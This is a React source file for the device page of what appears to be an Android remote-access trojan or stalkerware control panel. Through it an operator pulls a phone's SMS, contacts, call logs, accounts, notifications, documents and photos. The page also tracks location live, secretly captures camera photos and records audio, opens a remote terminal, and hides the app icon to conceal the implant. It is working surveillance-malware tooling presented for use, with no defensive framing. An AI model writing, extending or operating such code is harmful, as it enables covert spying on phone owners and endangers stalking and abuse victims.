import { useState, useEffect, useRef, useCallback } from "react";
import { useParams, useNavigate } from "react-router-dom";
import {
  FiArrowLeft,
  FiRefreshCw,
  FiEyeOff,
  FiEye,
  FiTrash2,
  FiSmartphone,
  FiUsers,
  FiMessageSquare,
  FiPhone,
  FiMapPin,
  FiImage,
  FiVideo,
  FiFolder,
  FiMic,
  FiCamera,
  FiBell,
  FiWifi,
  FiTerminal,
} from "react-icons/fi";
import toast from "react-hot-toast";
import useSocket from "../hooks/useSocket";
import {
  fetchDevice,
  deleteDevice,
  deleteMedia,
  deleteAllMedia,
  deleteDataType,
  deleteDataItem,
  openInMaps,
} from "../hooks/useApi";
import OverviewTab from "../components/devices/OverviewTab";
import QuickActions from "../components/devices/QuickActions";
import { StatusBadge } from "../components/devices/OverviewTab";
import {
  SearchBar,
  RefreshBtn,
  EmptyState,
  Section,
} from "../components/devices/DataList";
import PhotoGrid from "../components/devices/PhotoGrid";
import TerminalTab from "../components/devices/TerminalTab";

const tabs = [
  { id: "overview", label: "Overview", icon: FiSmartphone },
  { id: "contacts", label: "Contacts", icon: FiUsers },
  { id: "sms", label: "SMS", icon: FiMessageSquare },
  { id: "calls", label: "Calls", icon: FiPhone },
  { id: "location", label: "Location", icon: FiMapPin },
  { id: "photos", label: "Photos", icon: FiImage },
  { id: "videos", label: "Videos", icon: FiVideo },
  { id: "files", label: "Files", icon: FiFolder },
  { id: "apps", label: "Apps", icon: FiSmartphone },
  { id: "camera", label: "Camera", icon: FiCamera },
  { id: "audio", label: "Audio", icon: FiMic },
  { id: "notifications", label: "Notifs", icon: FiBell },
  { id: "wifi", label: "WiFi", icon: FiWifi },
  { id: "accounts", label: "Accounts", icon: FiUsers },
  { id: "terminal", label: "Terminal", icon: FiTerminal },
];

export default function DeviceDetails() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState("overview");
  const [commands, setCommands] = useState([]);
  const [terminalInput, setTerminalInput] = useState("");
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [searches, setSearches] = useState({
    contacts: "",
    sms: "",
    calls: "",
  });
  const terminalRef = useRef(null);

  const refresh = useCallback(async () => {
    const d = await fetchDevice(deviceId);
    if (d) {
      setDevice(d);
      setCommands(d.commands?.slice(-50).reverse() || []);
    } else navigate("/devices");
    setLoading(false);
  }, [deviceId]);

  useEffect(() => {
    refresh();
  }, [refresh]);

  const onConnect = () => addTerminalOutput("[System] WebSocket connected");
  const onDisconnect = (r) => addTerminalOutput(`[System] Disconnected: ${r}`);
  const onUpdate = () => refresh();
  const onCommandSent = (d) => setCommands((prev) => [d, ...prev]);
  const onResult = (d) => {
    addTerminalOutput(`[Result] ${JSON.stringify(d.result).substring(0, 200)}`);
    refresh();
  };

  const { send, sendImmediate } = useSocket(deviceId, {
    onConnect,
    onDisconnect,
    onUpdate,
    onCommandSent,
    onResult,
  });

  const addTerminalOutput = (text) => {
    setTerminalOutput((prev) => [
      ...prev,
      { text, time: new Date().toLocaleTimeString() },
    ]);
    setTimeout(
      () => terminalRef.current?.scrollTo(0, terminalRef.current.scrollHeight),
      100
    );
  };

  const handleTerminalSubmit = (e) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;
    const [cmd, ...args] = terminalInput.trim().split(" ");
    let params = {};
    try {
      if (args.length) params = JSON.parse(args.join(" "));
    } catch {
      params = { value: args.join(" ") };
    }
    sendImmediate(cmd, params);
    setTerminalInput("");
  };

  const handleDeleteDevice = async () => {
    if (!confirm("Delete device? Cannot be undone.")) return;
    if (await deleteDevice(deviceId)) navigate("/devices");
  };

  // Generic data renderer for contacts, sms, calls
  const renderList = (items, searchKey, renderItem, fetchCmd) => {
    const filtered = searches[searchKey]
      ? items.filter((item) =>
          JSON.stringify(item)
            .toLowerCase()
            .includes(searches[searchKey].toLowerCase())
        )
      : items;
    return (
      <Section
        title={searchKey.charAt(0).toUpperCase() + searchKey.slice(1)}
        count={items.length}
        buttons={[
          <SearchBar
            key="s"
            value={searches[searchKey]}
            onChange={(v) => setSearches((p) => ({ ...p, [searchKey]: v }))}
            placeholder={`Search ${searchKey}...`}
          />,
          <RefreshBtn key="r" onClick={() => send(fetchCmd)} />,
        ]}
      >
        {filtered.length > 0 ? (
          <div className="space-y-2 max-h-96 overflow-y-auto">
            {filtered.map(renderItem)}
          </div>
        ) : (
          <EmptyState
            message={
              searches[searchKey]
                ? `No ${searchKey} match`
                : `No ${searchKey} data`
            }
            action={{
              label: `Fetch ${searchKey}`,
              onClick: () => send(fetchCmd),
            }}
          />
        )}
      </Section>
    );
  };

  if (loading)
    return (
      <div className="flex items-center justify-center h-96">
        <FiRefreshCw className="text-4xl text-primary-400 animate-spin" />
      </div>
    );
  if (!device) return null;

  const data = device.data || {};

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate("/devices")}
            className="p-2 rounded-xl hover:bg-dark-700/50"
          >
            <FiArrowLeft className="text-xl" />
          </button>
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold">
                {device.alias || device.deviceModel || "Unknown"}
              </h1>
              <StatusBadge status={device.status} />
            </div>
            <p className="text-dark-400 text-sm mt-1">
              {device.deviceId} · {device.ip}
            </p>
          </div>
        </div>
        <div className="flex gap-2">
          <button
            onClick={refresh}
            className="p-2 rounded-xl hover:bg-dark-700/50"
            title="Refresh"
          >
            <FiRefreshCw className="text-lg" />
          </button>
          <button
            onClick={() => send("hide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50"
            title="Hide"
          >
            <FiEyeOff className="text-lg" />
          </button>
          <button
            onClick={() => send("unhide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50"
            title="Unhide"
          >
            <FiEye className="text-lg" />
          </button>
          <button
            onClick={handleDeleteDevice}
            className="p-2 rounded-xl bg-red-500/20 text-red-400 hover:bg-red-500/30"
            title="Delete"
          >
            <FiTrash2 className="text-lg" />
          </button>
        </div>
      </div>

      <QuickActions onCommand={send} />

      {/* Tab Bar */}
      <div className="flex gap-1 p-1 glass-effect rounded-xl overflow-x-auto">
        {tabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition-all ${
                activeTab === tab.id
                  ? "bg-primary-500/20 text-primary-400 border border-primary-500/30"
                  : "text-dark-400 hover:text-white hover:bg-dark-700/50"
              }`}
            >
              <Icon className="text-sm" /> {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      <div className="min-h-[400px]">
        {activeTab === "overview" && (
          <OverviewTab device={device} commands={commands} />
        )}

        {activeTab === "contacts" &&
          renderList(
            data.contacts || [],
            "contacts",
            (c, i) => (
              <div
                key={c.id || i}
                className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
              >
                <div>
                  <p className="font-medium">{c.name || "Unknown"}</p>
                  <p className="text-xs text-dark-400">
                    {(c.phones || []).map((p) => p.number).join(", ")}
                  </p>
                </div>
              </div>
            ),
            "get_contacts"
          )}

        {activeTab === "sms" &&
          renderList(
            data.sms || [],
            "sms",
            (m, i) => (
              <div
                key={m.id || i}
                className={`p-3 rounded-xl ${
                  m.type === "inbox"
                    ? "bg-dark-700/30"
                    : "bg-primary-500/5 border border-primary-500/10"
                }`}
              >
                <div className="flex items-center justify-between">
                  <p className="font-medium text-sm">{m.address}</p>
                  <span className="text-xs text-dark-400">
                    {m.date ? new Date(m.date).toLocaleString() : ""}
                  </span>
                </div>
                <p className="text-sm text-dark-300 mt-1">{m.body}</p>
              </div>
            ),
            "get_sms"
          )}

        {activeTab === "calls" &&
          renderList(
            data.callLogs || [],
            "calls",
            (c, i) => (
              <div
                key={c.id || i}
                className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
              >
                <div className="flex items-center gap-3">
                  <span
                    className={`w-2 h-2 rounded-full ${
                      c.type === "Incoming"
                        ? "bg-green-400"
                        : c.type === "Outgoing"
                        ? "bg-blue-400"
                        : c.type === "Missed"
                        ? "bg-red-400"
                        : "bg-yellow-400"
                    }`}
                  />
                  <div>
                    <p className="font-medium text-sm">{c.name || c.number}</p>
                    <p className="text-xs text-dark-400">
                      {c.type} · {c.duration || 0}s
                    </p>
                  </div>
                </div>
                <p className="text-xs text-dark-400">
                  {c.date ? new Date(c.date).toLocaleString() : ""}
                </p>
              </div>
            ),
            "get_call_logs"
          )}

        {activeTab === "location" && (
          <Section
            title="Location Tracking"
            buttons={[
              <button
                key="g"
                onClick={() => send("get_location")}
                className="text-sm bg-primary-500/10 text-primary-400 border border-primary-500/30 px-4 py-2 rounded-xl"
              >
                Get Location
              </button>,
              <button
                key="l"
                onClick={() => send("continuous_location")}
                className="text-sm bg-green-500/10 text-green-400 border border-green-500/30 px-4 py-2 rounded-xl"
              >
                Live Track
              </button>,
            ]}
          >
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-2 h-80 rounded-xl bg-dark-700/50 overflow-hidden">
                {data.locations?.length ? (
                  <iframe
                    title="Map"
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    style={{ border: 0 }}
                    src={`https://www.openstreetmap.org/export/embed.html?bbox=${
                      data.locations.slice(-1)[0].lng - 0.01
                    }%2C${data.locations.slice(-1)[0].lat - 0.01}%2C${
                      data.locations.slice(-1)[0].lng + 0.01
                    }%2C${
                      data.locations.slice(-1)[0].lat + 0.01
                    }&layer=mapnik&marker=${
                      data.locations.slice(-1)[0].lat
                    }%2C${data.locations.slice(-1)[0].lng}`}
                  />
                ) : (
                  <p className="text-dark-400 flex items-center justify-center h-full">
                    No location data
                  </p>
                )}
              </div>
              <div className="space-y-2 max-h-80 overflow-y-auto">
                {[...(data.locations || [])].reverse().map((loc, i) => (
                  <div
                    key={i}
                    className="p-3 rounded-xl bg-dark-700/30 cursor-pointer hover:bg-dark-700/50"
                    onClick={() => openInMaps(loc.lat, loc.lng)}
                  >
                    <p className="text-xs font-mono">
                      {loc.lat?.toFixed(6)}, {loc.lng?.toFixed(6)}
                    </p>
                    {loc.timestamp && (
                      <p className="text-xs text-dark-400 mt-1">
                        {new Date(loc.timestamp).toLocaleString()}
                      </p>
                    )}
                    {loc.address && (
                      <p className="text-xs text-dark-500 mt-1 truncate">
                        {loc.address}
                      </p>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </Section>
        )}

        {activeTab === "photos" && (
          <div className="space-y-6">
            <PhotoGrid
              photos={data.capturedPhotos}
              title="Captured Photos"
              emptyIcon={FiCamera}
              onTakePhoto={() => send("take_photo")}
              onDelete={(id) => deleteMedia(deviceId, "capturedPhotos", id)}
              onDeleteAll={() => deleteAllMedia("capturedPhotos")}
            />
            <PhotoGrid
              photos={data.photos}
              title="Gallery Photos"
              emptyIcon={FiImage}
              onRefresh={() => send("get_photos")}
              onDelete={(id) => deleteDataItem(deviceId, "photos", id)}
              onDeleteAll={() =>
                deleteDataType(deviceId, "photos", "Gallery Photos")
              }
            />
          </div>
        )}

        {activeTab === "videos" && (
          <Section
            title="Videos"
            count={data.videos?.length}
            buttons={[
              <RefreshBtn key="r" onClick={() => send("get_videos")} />,
              data.videos?.length > 0 && (
                <button
                  key="d"
                  onClick={() => deleteDataType(deviceId, "videos", "Videos")}
                  className="text-sm bg-red-500/10 text-red-400 border border-red-500/30 px-4 py-2 rounded-xl"
                >
                  Delete All
                </button>
              ),
            ]}
          >
            {data.videos?.length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {[...data.videos].reverse().map((v, i) => (
                  <div
                    key={v.publicId || i}
                    className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30"
                  >
                    <div className="flex items-center gap-4">
                      <div className="w-14 h-14 rounded-xl bg-purple-500/10 flex items-center justify-center">
                        <FiVideo className="text-purple-400 text-2xl" />
                      </div>
                      <div>
                        <p className="font-medium text-sm truncate max-w-[200px]">
                          {v.name || "Unknown"}
                        </p>
                        <p className="text-xs text-dark-400">
                          {v.size ? Math.round(v.size / 1048576) + " MB" : ""}{" "}
                          {v.timestamp
                            ? new Date(v.timestamp).toLocaleDateString()
                            : ""}
                        </p>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      {(v.url || v.cloudinaryUrl) && (
                        <a
                          href={v.url || v.cloudinaryUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                          onClick={() => toast.success("Opening...")}
                        >
                          <svg
                            className="w-4 h-4"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
                            />
                          </svg>
                        </a>
                      )}
                      <button
                        onClick={() =>
                          deleteDataItem(deviceId, "videos", v.id || v.publicId)
                        }
                        className="p-2 rounded-lg hover:bg-red-500/20 text-red-400"
                      >
                        <FiTrash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState
                icon={FiVideo}
                message="No video data"
                action={{
                  label: "Fetch videos",
                  onClick: () => send("get_videos"),
                }}
              />
            )}
          </Section>
        )}

        {activeTab === "camera" && (
          <Section
            title="Camera Controls"
            buttons={[
              <button
                key="b"
                onClick={() => {
                  send("take_photo_back");
                  toast.success("Back photo capturing...");
                }}
                className="text-sm bg-primary-500/10 text-primary-400 border border-primary-500/30 px-4 py-2 rounded-xl"
              >
                Back Camera
              </button>,
              <button
                key="f"
                onClick={() => {
                  send("take_photo_front");
                  toast.success("Front photo capturing...");
                }}
                className="text-sm bg-purple-500/10 text-purple-400 border border-purple-500/30 px-4 py-2 rounded-xl"
              >
                Front Camera
              </button>,
            ]}
          >
            {data.lastPhoto && (
              <div className="mb-4">
                <p className="text-sm text-dark-400 mb-2">Last Captured:</p>
                <img
                  src={data.lastPhoto.url}
                  alt=""
                  className="w-full max-w-md h-64 object-cover rounded-xl"
                />
              </div>
            )}
          </Section>
        )}

        {activeTab === "audio" && (
          <Section
            title="Recorded Audio"
            count={data.recordedAudios?.length}
            buttons={[
              <button
                key="r"
                onClick={() => send("record_audio", { action: "start" })}
                className="text-sm bg-orange-500/10 text-orange-400 border border-orange-500/30 px-4 py-2 rounded-xl"
              >
                Record
              </button>,
              data.recordedAudios?.length > 0 && (
                <button
                  key="d"
                  onClick={() =>
                    deleteDataType(deviceId, "recordedAudios", "Recordings")
                  }
                  className="text-sm bg-red-500/10 text-red-400 border border-red-500/30 px-4 py-2 rounded-xl"
                >
                  Delete All
                </button>
              ),
            ]}
          >
            {data.recordedAudios?.length > 0 ? (
              <div className="space-y-2 max-h-[500px] overflow-y-auto">
                {[...data.recordedAudios].reverse().map((a, i) => (
                  <div
                    key={a.publicId || i}
                    className="p-4 rounded-xl bg-dark-700/30"
                  >
                    <div className="flex items-center justify-between mb-2">
                      <p className="font-medium text-sm">
                        Recording {data.recordedAudios.length - i}
                      </p>
                      <button
                        onClick={() =>
                          deleteDataItem(deviceId, "recordedAudios", a.publicId)
                        }
                        className="text-red-400"
                      >
                        <FiTrash2 className="w-4 h-4" />
                      </button>
                    </div>
                    <audio src={a.url} controls className="w-full h-10" />
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState icon={FiMic} message="No recordings" />
            )}
          </Section>
        )}

        {activeTab === "files" && (
          <Section
            title="Documents"
            count={data.documents?.length}
            buttons={[
              <RefreshBtn key="r" onClick={() => send("get_documents")} />,
              data.documents?.length > 0 && (
                <button
                  key="d"
                  onClick={() =>
                    deleteDataType(deviceId, "documents", "Documents")
                  }
                  className="text-sm bg-red-500/10 text-red-400 border border-red-500/30 px-4 py-2 rounded-xl"
                >
                  Delete All
                </button>
              ),
            ]}
          >
            {data.documents?.length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {[...data.documents].reverse().map((d, i) => (
                  <div
                    key={d.id || d.publicId || i}
                    className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30"
                  >
                    <div className="flex items-center gap-4">
                      <div className="w-14 h-14 rounded-xl bg-blue-500/10 flex items-center justify-center">
                        <FiVideo className="text-blue-400 text-2xl" />
                      </div>
                      <div>
                        <p className="font-medium text-sm truncate max-w-[200px]">
                          {d.name || "Unknown"}
                        </p>
                        <p className="text-xs text-dark-400">
                          {d.size ? `${(d.size / 1024).toFixed(0)} KB` : ""}
                        </p>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      {(d.url || d.cloudinaryUrl) && (
                        <a
                          href={d.url || d.cloudinaryUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                        >
                          <svg
                            className="w-4 h-4"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
                            />
                          </svg>
                        </a>
                      )}
                      <button
                        onClick={() =>
                          deleteDataItem(
                            deviceId,
                            "documents",
                            d.id || d.publicId
                          )
                        }
                        className="p-2 rounded-lg hover:bg-red-500/20 text-red-400"
                      >
                        <FiTrash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState
                icon={FiVideo}
                message="No documents"
                action={{
                  label: "Fetch documents",
                  onClick: () => send("get_documents"),
                }}
              />
            )}
          </Section>
        )}

        {activeTab === "apps" && (
          <Section
            title="Installed Apps"
            count={data.installedApps?.length}
            buttons={[
              <RefreshBtn key="r" onClick={() => send("get_installed_apps")} />,
            ]}
          >
            {data.installedApps?.length > 0 ? (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[600px] overflow-y-auto">
                {data.installedApps.map((a, i) => (
                  <div
                    key={a.packageName || i}
                    className="p-3 rounded-xl bg-dark-700/30"
                  >
                    <p className="text-sm font-medium truncate">
                      {a.appName || "Unknown"}
                    </p>
                    <p className="text-xs text-dark-400 truncate">
                      {a.packageName}
                    </p>
                    <p className="text-xs text-dark-500">
                      v{a.versionName || "?"} ·{" "}
                      {a.isSystemApp ? "System" : "User"}
                    </p>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState
                icon={FiSmartphone}
                message="No app data"
                action={{
                  label: "Fetch apps",
                  onClick: () => send("get_installed_apps"),
                }}
              />
            )}
          </Section>
        )}

        {activeTab === "notifications" && (
          <Section
            title="Notifications"
            buttons={[
              <RefreshBtn key="r" onClick={() => send("get_notifications")} />,
              <button
                key="e"
                onClick={() => send("enable_notification_listener")}
                className="text-sm bg-yellow-500/10 text-yellow-400 border border-yellow-500/30 px-4 py-2 rounded-xl"
              >
                Enable Access
              </button>,
            ]}
          >
            {data.notifications?.length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {data.notifications.map((n, i) => (
                  <div key={i} className="p-4 rounded-xl bg-dark-700/30">
                    <div className="flex items-center justify-between mb-2">
                      <p className="font-medium text-sm">
                        {n.title || n.app || "Notification"}
                      </p>
                      <span className="text-xs text-dark-400">
                        {n.timestamp
                          ? new Date(n.timestamp).toLocaleTimeString()
                          : ""}
                      </span>
                    </div>
                    <p className="text-sm text-dark-300">
                      {n.text || n.body || ""}
                    </p>
                    {n.packageName && (
                      <p className="text-xs text-dark-500 mt-2">
                        {n.packageName}
                      </p>
                    )}
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState icon={FiBell} message="No notifications" />
            )}
          </Section>
        )}

        {activeTab === "wifi" && (
          <Section
            title="WiFi Networks"
            buttons={[
              <RefreshBtn
                key="r"
                onClick={() => send("get_wifi_networks")}
                label="Scan"
              />,
            ]}
          >
            {data.wifiNetworks?.length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {data.wifiNetworks.map((n, i) => (
                  <div
                    key={i}
                    className="p-4 rounded-xl bg-dark-700/30 flex items-center justify-between"
                  >
                    <div className="flex items-center gap-3">
                      <span
                        className={`w-2 h-2 rounded-full ${
                          n.level > -50
                            ? "bg-green-400"
                            : n.level > -70
                            ? "bg-yellow-400"
                            : "bg-red-400"
                        }`}
                      />
                      <div>
                        <p className="font-medium text-sm">
                          {n.ssid || "Hidden"}
                        </p>
                        <p className="text-xs text-dark-400">{n.bssid}</p>
                      </div>
                    </div>
                    <p className="text-xs text-dark-400">{n.level} dBm</p>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState
                icon={FiWifi}
                message="No WiFi data"
                action={{
                  label: "Scan",
                  onClick: () => send("get_wifi_networks"),
                }}
              />
            )}
          </Section>
        )}

        {activeTab === "accounts" && (
          <Section
            title="Accounts"
            buttons={[
              <RefreshBtn key="r" onClick={() => send("get_accounts")} />,
            ]}
          >
            {data.accounts?.length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {data.accounts.map((a, i) => (
                  <div
                    key={i}
                    className="flex items-center gap-3 p-4 rounded-xl bg-dark-700/30"
                  >
                    <div>
                      <p className="font-medium text-sm">
                        {a.name || "Unknown"}
                      </p>
                      <p className="text-xs text-dark-400">
                        {a.type || "Account"}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyState
                icon={FiUsers}
                message="No accounts"
                action={{
                  label: "Fetch accounts",
                  onClick: () => send("get_accounts"),
                }}
              />
            )}
          </Section>
        )}

        {activeTab === "terminal" && (
          <TerminalTab
            deviceId={deviceId}
            terminalOutput={terminalOutput}
            terminalInput={terminalInput}
            setTerminalInput={setTerminalInput}
            onSubmit={handleTerminalSubmit}
            terminalRef={terminalRef}
          />
        )}
      </div>
    </div>
  );
}
